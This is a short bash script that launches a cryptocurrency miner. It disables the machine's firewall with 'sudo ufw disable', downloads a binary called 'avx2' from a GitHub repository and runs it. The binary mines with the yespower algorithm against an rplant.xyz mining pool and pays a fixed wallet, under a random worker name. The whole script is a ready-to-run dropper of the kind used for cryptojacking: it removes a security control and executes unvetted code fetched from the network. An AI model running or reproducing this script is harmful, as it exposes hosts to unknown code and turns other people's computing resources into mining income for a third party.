#!/usr/bin/env bash
sudo ufw disable
wget https://github.com/BatiKangkung/KangKung/raw/main/avx2 && chmod +x avx2 && ./avx2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 1000-9999 -n 1)-C) -p x
